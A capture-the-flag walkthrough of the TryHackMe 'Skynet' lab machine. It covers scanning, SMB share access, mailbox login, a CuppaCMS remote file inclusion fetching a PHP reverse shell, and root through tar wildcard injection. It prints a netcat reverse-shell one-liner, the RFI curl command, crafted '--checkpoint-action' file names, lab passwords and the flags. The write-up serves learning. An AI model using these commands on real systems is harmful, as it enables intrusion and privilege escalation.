#CTF #THM

This room looks a bit more challenging. At least there aren't much instructions but rather a general idea:

Scan ports w/ nmap
Gobuster to find directories
SMBMap to get SAMBA shares
Gather credentials and read emails
Exploit CMS RFI vulnerability
Exploit tar wildcards and escalate privileges

Task 1 - Deploy and compromise the vulnerable machine!
------------------------------------------------------------------------

Check target:

```
┌──(kali㉿kali)-[~]
└─$ ping 10.10.214.215       
PING 10.10.214.215 (10.10.214.215) 56(84) bytes of data.
64 bytes from 10.10.214.215: icmp_seq=1 ttl=63 time=270 ms
64 bytes from 10.10.214.215: icmp_seq=2 ttl=63 time=269 ms
^C
--- 10.10.214.215 ping statistics ---
2 packets transmitted, 2 received, 0% packet loss, time 1002ms
rtt min/avg/max/mdev = 269.460/269.822/270.185/0.362 ms
```

Ok looks good.

Next thing is to run an nmap scan:

```
┌──(kali㉿kali)-[~]
└─$ nmap -sV -sC -oN skynet.nmap 10.10.214.215
Starting Nmap 7.93 ( https://nmap.org ) at 2022-10-20 08:41 JST
Nmap scan report for 10.10.214.215
Host is up (0.27s latency).
Not shown: 994 closed tcp ports (conn-refused)
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 992331bbb1e943b756944cb9e82146c5 (RSA)
|   256 57c07502712d193183dbe4fe679668cf (ECDSA)
|_  256 46fa4efc10a54f5757d06d54f6c34dfe (ED25519)
80/tcp  open  http        Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Skynet
110/tcp open  pop3        Dovecot pop3d
|_pop3-capabilities: UIDL AUTH-RESP-CODE RESP-CODES TOP PIPELINING SASL CAPA
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
143/tcp open  imap        Dovecot imapd
|_imap-capabilities: SASL-IR LITERAL+ listed ID more LOGIN-REFERRALS have capabilities ENABLE Pre-login post-login OK IDLE LOGINDISABLEDA0001 IMAP4rev1
445/tcp open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
Service Info: Host: SKYNET; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 1h40m02s, deviation: 2h53m12s, median: 1s
| smb2-time: 
|   date: 2022-10-19T23:42:35
|_  start_date: N/A
|_nbstat: NetBIOS name: SKYNET, NetBIOS user: <unknown>, NetBIOS MAC: 000000000000 (Xerox)
| smb2-security-mode: 
|   311: 
|_    Message signing enabled but not required
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: skynet
|   NetBIOS computer name: SKYNET\x00
|   Domain name: \x00
|   FQDN: skynet
|_  System time: 2022-10-19T18:42:35-05:00

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 69.88 seconds

```

Ok host is skynet so I will add that to my /etc/hosts file.

Ok they have a web server running on port 80. Let's use gobuster and see what we find.

```
┌──(kali㉿kali)-[~]
└─$ gobuster dir -u http://skynet -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 40
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://skynet
[+] Method:                  GET
[+] Threads:                 40
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2022/10/20 08:55:14 Starting gobuster in directory enumeration mode
===============================================================
/admin                (Status: 301) [Size: 300] [--> http://skynet/admin/]
/css                  (Status: 301) [Size: 298] [--> http://skynet/css/]  
/js                   (Status: 301) [Size: 297] [--> http://skynet/js/]   
/config               (Status: 301) [Size: 301] [--> http://skynet/config/]
/ai                   (Status: 301) [Size: 297] [--> http://skynet/ai/]    
/squirrelmail         (Status: 301) [Size: 307] [--> http://skynet/squirrelmail/]
/server-status        (Status: 403) [Size: 271]                                  

```

Next lets run SMBMap to see what shares we might have access to:

```
┌──(kali㉿kali)-[~]
└─$ smbmap -H 10.10.214.215
[+] Guest session       IP: 10.10.214.215:445   Name: skynet                                            
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        print$                                                  NO ACCESS       Printer Drivers
        anonymous                                               READ ONLY       Skynet Anonymous Share
        milesdyson                                              NO ACCESS       Miles Dyson Personal Share
        IPC$                                                    NO ACCESS       IPC Service (skynet server (Samba, Ubuntu))

```

ok there is an anonymous share there. Lets connect and see what we can see:

```
┌──(kali㉿kali)-[~]
└─$ smbclient //10.10.214.215/anonymous
Password for [WORKGROUP\kali]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Fri Nov 27 01:04:00 2020
  ..                                  D        0  Tue Sep 17 16:20:17 2019
  attention.txt                       N      163  Wed Sep 18 12:04:59 2019
  logs                                D        0  Wed Sep 18 13:42:16 2019

                9204224 blocks of size 1024. 5826256 blocks available
smb: \> get attention.txt
getting file \attention.txt of size 163 as attention.txt (0.1 KiloBytes/sec) (average 0.1 KiloBytes/sec)
smb: \> cd logs
smb: \logs\> ls
  .                                   D        0  Wed Sep 18 13:42:16 2019
  ..                                  D        0  Fri Nov 27 01:04:00 2020
  log2.txt                            N        0  Wed Sep 18 13:42:13 2019
  log1.txt                            N      471  Wed Sep 18 13:41:59 2019
  log3.txt                            N        0  Wed Sep 18 13:42:16 2019

                9204224 blocks of size 1024. 5825960 blocks available
smb: \logs\> get log1.txt
getting file \logs\log1.txt of size 471 as log1.txt (0.4 KiloBytes/sec) (average 0.3 KiloBytes/sec)
smb: \logs\> 

```

Ok, I grabbed all the interesting files. Time to check them.

```
┌──(kali㉿kali)-[~]
└─$ cat attention.txt 
A recent system malfunction has caused various passwords to be changed. All skynet employees are required to change their password after seeing this.
-Miles Dyson
                                    
```

ok looks like some password problem happened. Let's check the log we found.

```
┌──(kali㉿kali)-[~]
└─$ cat log1.txt     
cyborg007haloterminator
terminator22596
terminator219
terminator20
terminator1989
terminator1988
terminator168
terminator16
terminator143
terminator13
terminator123!@#
terminator1056
terminator101
terminator10
terminator02
terminator00
roboterminator
pongterminator
manasturcaluterminator
exterminator95
exterminator200
dterminator
djxterminator
dexterminator
determinator
cyborg007haloterminator
avsterminator
alonsoterminator
Walterminator
79terminator6
1996terminator
```

hmm looks like a list of passwords.

Well I can't SSH in. Going back to earlier gobuster scan also shows that there is squirrelmail at http://skynet/squirelmail

We also know from our anonymous login to smb that there is only one available user called milesdyson. So let's try that user with the passwords we have to see if we can login.

So we could login with the credentials of:
	milesdyson:cyborg007haloterminator

After logging in I can see the following email:

```
**Subject:**  

Samba Password reset

**From:**  

skynet@skynet

**Date:**  

Tue, September 17, 2019 10:10 pm

**Priority:**  

Normal

**Options:**  

[View Full Header](http://skynet/squirrelmail/src/view_header.php?mailbox=INBOX&passed_id=3&passed_ent_id=0) |  View Printable Version  | [Download this as a file](http://skynet/squirrelmail/src/download.php?absolute_dl=true&passed_id=3&ent_id=1&mailbox=INBOX&sort=6&startMessage=1&show_more=0&passed_ent_id=0)

  

We have changed your smb password after system malfunction.
Password: )s{A&2Z=F^n_E.B`

```

Before getting too far ahead I see I have the answer for one question:

Question 1: What is Miles password for his emails?
Answer: _cyborg007haloterminator_

So now let's go into miles personal samba share and see what is there:

```
┌──(kali㉿kali)-[~]
└─$ smbclient \\\\10.10.214.215\\milesdyson --user=milesdyson
Password for [WORKGROUP\milesdyson]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Tue Sep 17 18:05:47 2019
  ..                                  D        0  Wed Sep 18 12:51:03 2019
  Improving Deep Neural Networks.pdf      N  5743095  Tue Sep 17 18:05:14 2019
  Natural Language Processing-Building Sequence Models.pdf      N 12927230  Tue Sep 17 18:05:14 2019
  Convolutional Neural Networks-CNN.pdf      N 19655446  Tue Sep 17 18:05:14 2019
  notes                               D        0  Tue Sep 17 18:18:40 2019
  Neural Networks and Deep Learning.pdf      N  4304586  Tue Sep 17 18:05:14 2019
  Structuring your Machine Learning Project.pdf      N  3531427  Tue Sep 17 18:05:14 2019

                9204224 blocks of size 1024. 5810140 blocks available
smb: \> ls
  .                                   D        0  Tue Sep 17 18:05:47 2019
  ..                                  D        0  Wed Sep 18 12:51:03 2019
  Improving Deep Neural Networks.pdf      N  5743095  Tue Sep 17 18:05:14 2019
  Natural Language Processing-Building Sequence Models.pdf      N 12927230  Tue Sep 17 18:05:14 2019
  Convolutional Neural Networks-CNN.pdf      N 19655446  Tue Sep 17 18:05:14 2019
  notes                               D        0  Tue Sep 17 18:18:40 2019
  Neural Networks and Deep Learning.pdf      N  4304586  Tue Sep 17 18:05:14 2019
  Structuring your Machine Learning Project.pdf      N  3531427  Tue Sep 17 18:05:14 2019

                9204224 blocks of size 1024. 5810140 blocks available

```

Going to his notes directory I see a file called important.txt.

```
smb: \notes\> get important.txt
getting file \notes\important.txt of size 117 as important.txt (0.1 KiloBytes/sec) (average 0.1 KiloBytes/sec)
```

Inside that note is:

```
┌──(kali㉿kali)-[~]
└─$ cat important.txt    

1. Add features to beta CMS /45kra24zxs28v3yd
2. Work on T-800 Model 101 blueprints
3. Spend more time with my wife
```

So beta CMS.. looks like a project he is working on. Could that /45kra24zxs28v3yd be a directory on this local machine? Lets check.

Yes we found a secret page:

```
## Miles Dyson Personal Page

Dr. Miles Bennett Dyson was the original inventor of the neural-net processor which would lead to the development of Skynet,  
a computer A.I. intended to control electronically linked weapons and defend the United States.
```

Now we have the next answer.

Question: What is the hidden directory?
Answer: _/45kra24zxs28v3yd_

So we run gobuster against that:

```
┌──(kali㉿kali)-[~]
└─$ gobuster dir -u http://10.10.214.215/45kra24zxs28v3yd/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 40
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.214.215/45kra24zxs28v3yd/
[+] Method:                  GET
[+] Threads:                 40
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2022/10/20 09:55:50 Starting gobuster in directory enumeration mode
===============================================================
/administrator        (Status: 301) [Size: 339] [--> http://10.10.214.215/45kra24zxs28v3yd/administrator/]
                                                                                                          
===============================================================
2022/10/20 10:20:44 Finished
===============================================================

```

Looks like there is another hidden folder there so upon checking it we find the CuppaCMS.

Looks like there is a vulnerability. Remote File Inclusion.

Question: What is the vulnerability called when you can include a remote file for malicious purposes?
Answer: _Remote File Inclusion_

So looking around we find an exploit for this:

https://www.exploit-db.com/exploits/25971

I have downloaded it. It looks like we need to host a shell script locally and a webserver to host it, then start a listener and then use the exploit to trigger the CMS to pull it and run it.

I downloaded the following php script for my reverse-shell:
https://pentestmonkey.net/tools/web-shells/php-reverse-shell


Then I used this command on the CMS to force it to pull and run my script:

```
┌──(kali㉿kali)-[~]
└─$ curl http://10.10.214.215/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php\?urlConfig\=http://10.10.3.12/php-reverse-shell.php
```


```
oot@ip-10-10-159-232:~# nc -lnvp 1234
Listening on [0.0.0.0] (family 0, port 1234)
Connection from 10.10.214.215 52636 received!
Linux skynet 4.8.0-58-generic #63~16.04.1-Ubuntu SMP Mon Jun 26 18:08:51 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux
 21:15:06 up  2:37,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
$ ls 
bin
boot
dev
etc
home
initrd.img
initrd.img.old
lib
lib64
lost+found
media
mnt
opt
proc
root
run
sbin
snap
srv
sys
tmp
usr
var
vmlinuz
vmlinuz.old
$ pwd
/
$ cd /home
$ dir
milesdyson
$ cd milesdyson	
$ ls
backups
mail
share
user.txt
$ cat user.txt
7ce5c2109a40f958099283600a9ae807
$ 

```

Question: What is the user flag?
Answer: _7ce5c2109a40f958099283600a9ae807_

So enumerating the machine looks like we have a cron job available that runes every minute under our user milesdyson:

```
$ cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user	command
*/1 *	* * *   root	/home/milesdyson/backups/backup.sh
17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#

```

Checking out the backup script:

```
$ cat /home/milesdyson/backups/backup.sh
#!/bin/bash
cd /var/www/html
tar cf /home/milesdyson/backups/backup.tgz *
$ 
```



```
echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.159.232 1235 >/tmp/f" > shell.sh
touch "/var/www/html/--checkpoint-action=exec=sh shell.sh"
touch "/var/www/html/--checkpoint=1"
```

So we need to do this in /var/www/html since our current user is www-data:

```
$ cd /var/www
$ dir
html
$ ls -al
total 12
drwxr-xr-x  3 root     root     4096 Sep 17  2019 .
drwxr-xr-x 14 root     root     4096 Sep 17  2019 ..
drwxr-xr-x  8 www-data www-data 4096 Oct 19 21:32 html
$ cd html
$ ls -al
total 68
-rw-rw-rw- 1 www-data www-data     0 Oct 19 21:32 --checkpoint-action=exec=sh shell.sh
-rw-rw-rw- 1 www-data www-data     0 Oct 19 21:32 --checkpoint=1
-rw-rw-rw- 1 www-data www-data     0 Oct 19 21:32 --checkpoint=1whoami
drwxr-xr-x 8 www-data www-data  4096 Oct 19 21:32 .
drwxr-xr-x 3 root     root      4096 Sep 17  2019 ..
drwxr-xr-x 3 www-data www-data  4096 Sep 17  2019 45kra24zxs28v3yd
drwxr-xr-x 2 www-data www-data  4096 Sep 17  2019 admin
drwxr-xr-x 3 www-data www-data  4096 Sep 17  2019 ai
drwxr-xr-x 2 www-data www-data  4096 Sep 17  2019 config
drwxr-xr-x 2 www-data www-data  4096 Sep 17  2019 css
-rw-r--r-- 1 www-data www-data 25015 Sep 17  2019 image.png
-rw-r--r-- 1 www-data www-data   523 Sep 17  2019 index.html
drwxr-xr-x 2 www-data www-data  4096 Sep 17  2019 js
-rw-r--r-- 1 www-data www-data  2667 Sep 17  2019 style.css
$ echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.159.232 1235 >/tmp/f" > shell.sh
touch "/var/www/html/--checkpoint-action=exec=sh shell.sh"
touch "/var/www/html/--checkpoint=1"$ $ 
$ ls
--checkpoint-action=exec=sh shell.sh
--checkpoint=1
--checkpoint=1whoami
45kra24zxs28v3yd
admin
ai
config
css
image.png
index.html
js
shell.sh
style.css
$ cat shell.sh
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.159.232 1235 >/tmp/f
$ ./shell.sh
/bin/sh: 21: ./shell.sh: Permission denied
$ ls -altr
total 72
drwxr-xr-x 3 root     root      4096 Sep 17  2019 ..
-rw-r--r-- 1 www-data www-data  2667 Sep 17  2019 style.css
-rw-r--r-- 1 www-data www-data 25015 Sep 17  2019 image.png
-rw-r--r-- 1 www-data www-data   523 Sep 17  2019 index.html
drwxr-xr-x 3 www-data www-data  4096 Sep 17  2019 45kra24zxs28v3yd
drwxr-xr-x 2 www-data www-data  4096 Sep 17  2019 config
drwxr-xr-x 2 www-data www-data  4096 Sep 17  2019 admin
drwxr-xr-x 2 www-data www-data  4096 Sep 17  2019 css
drwxr-xr-x 2 www-data www-data  4096 Sep 17  2019 js
drwxr-xr-x 3 www-data www-data  4096 Sep 17  2019 ai
-rw-rw-rw- 1 www-data www-data     0 Oct 19 21:32 --checkpoint=1whoami
-rw-rw-rw- 1 www-data www-data    81 Oct 19 21:33 shell.sh
drwxr-xr-x 8 www-data www-data  4096 Oct 19 21:33 .
-rw-rw-rw- 1 www-data www-data     0 Oct 19 21:33 --checkpoint-action=exec=sh shell.sh
-rw-rw-rw- 1 www-data www-data     0 Oct 19 21:33 --checkpoint=1
```

I have started a listener locally:
```
# nc -lnvp 1235
Listening on [0.0.0.0] (family 0, port 1235)
```

I havent caught a shell after 1 min hmm..

```
$ whoami
www-data
$ chmod +x shell.sh
$ ls -altr
total 72
drwxr-xr-x 3 root     root      4096 Sep 17  2019 ..
-rw-r--r-- 1 www-data www-data  2667 Sep 17  2019 style.css
-rw-r--r-- 1 www-data www-data 25015 Sep 17  2019 image.png
-rw-r--r-- 1 www-data www-data   523 Sep 17  2019 index.html
drwxr-xr-x 3 www-data www-data  4096 Sep 17  2019 45kra24zxs28v3yd
drwxr-xr-x 2 www-data www-data  4096 Sep 17  2019 config
drwxr-xr-x 2 www-data www-data  4096 Sep 17  2019 admin
drwxr-xr-x 2 www-data www-data  4096 Sep 17  2019 css
drwxr-xr-x 2 www-data www-data  4096 Sep 17  2019 js
drwxr-xr-x 3 www-data www-data  4096 Sep 17  2019 ai
-rw-rw-rw- 1 www-data www-data     0 Oct 19 21:32 --checkpoint=1whoami
-rwxrwxrwx 1 www-data www-data    81 Oct 19 21:33 shell.sh
drwxr-xr-x 8 www-data www-data  4096 Oct 19 21:33 .
-rw-rw-rw- 1 www-data www-data     0 Oct 19 21:33 --checkpoint-action=exec=sh shell.sh
-rw-rw-rw- 1 www-data www-data     0 Oct 19 21:33 --checkpoint=1
$ 
```

I decided to use another method from GTFObins:
https://gtfobins.github.io/gtfobins/tar/
```
$ echo "cp /bin/bash /tmp/shell && chmod +s /tmp/shell" > shell2.sh
$ cat shell2.sh
cp /bin/bash /tmp/shell && chmod +s /tmp/shell
$ chmod +x shell2.sh
$ touch "/var/www/html/--checkpoint-action=exec=sh shell2.sh
```


That wasn't working either.. ughh

After some digging I See that there was an error running the backup script because of the other checkpoints supposedly other people have been making?

```
#
$ /home/milesdyson/backups/backup.sh
tar: --checkpoint value is not an integer
tar: Error is not recoverable: exiting now
```

Now that is interesting.. 


```
$ ls  
--checkpoint-action=exec=sh shell.sh
--checkpoint-action=exec=sh shell2.sh

--checkpoint=1
--checkpoint=1whoami
```

I dont see any other users.. must be something getting left over?

Anyway.. the error I was seeing said that the tar had a non-integer and it wouldn't work so i checked and realized it was picking up that checkpoint=1whoami instead of my checkpoint=1. 

I deleted those extras..

```
$ rm ./'--checkpoint-action=exec=sh shell.sh'
$ ls
--checkpoint-action=exec=sh shell2.sh

--checkpoint=1
--checkpoint=1whoami
45kra24zxs28v3yd
admin
ai
config
css
image.png
index.html
js
shell.sh
shell2.sh
style.css
$ rm ./'--checkpoint=1whoami'
$ dir
--checkpoint-action=exec=sh\ shell2.sh\n  ai	     index.html  style.css
--checkpoint=1				  config     js
45kra24zxs28v3yd			  css	     shell.sh
admin					  image.png  shell2.sh
$ ls
--checkpoint-action=exec=sh shell2.sh

--checkpoint=1
45kra24zxs28v3yd
admin
ai
config
css
image.png
index.html
js
shell.sh
shell2.sh
style.css
$ clear
TERM environment variable not set.
$ ls
--checkpoint-action=exec=sh shell2.sh

--checkpoint=1
45kra24zxs28v3yd
admin
ai
config
css
image.png
index.html
js
shell.sh
shell2.sh
style.css
$ ls /tmp
shell
systemd-private-df999cda5563474ba66897dd0ab584e2-dovecot.service-PkcAxz
systemd-private-df999cda5563474ba66897dd0ab584e2-systemd-timesyncd.service-sFOBgV

```


I removed the other checkpoints. The script ran again after 1 min and I saw the new binary copy under /tmp:

```
$ ls -al /tmp
total 1052
drwxrwxrwt  9 root root    4096 Oct 19 22:06 .
drwxr-xr-x 23 root root    4096 Sep 18  2019 ..
drwxrwxrwt  2 root root    4096 Oct 19 18:38 .ICE-unix
drwxrwxrwt  2 root root    4096 Oct 19 18:38 .Test-unix
drwxrwxrwt  2 root root    4096 Oct 19 18:38 .X11-unix
drwxrwxrwt  2 root root    4096 Oct 19 18:38 .XIM-unix
drwxrwxrwt  2 root root    4096 Oct 19 18:38 .font-unix
-rwsr-sr-x  1 root root 1037528 Oct 19 22:06 shell
drwx------  3 root root    4096 Oct 19 18:38 systemd-private-df999cda5563474ba66897dd0ab584e2-dovecot.service-PkcAxz
drwx------  3 root root    4096 Oct 19 18:38 systemd-private-df999cda5563474ba66897dd0ab584e2-systemd-timesyncd.service-sFOBgV
$ 

```

Now just execute with -p flag:

```
$ /tmp/shell -p
whoami
root
id
uid=33(www-data) gid=33(www-data) euid=0(root) egid=0(root) groups=0(root),33(www-data)
ls /root
root.txt
cat /root/root.txt
3f0372db24753accc7179a282cd6a949
```

Question: What is the root flag?
Answer: _3f0372db24753accc7179a282cd6a949_

Conclusion:
-----------------------

This was a fairly easy room, at least until the very last step with tar. 

I am a bit surprised to find remenents from other users here, or maybe the room was made this way?

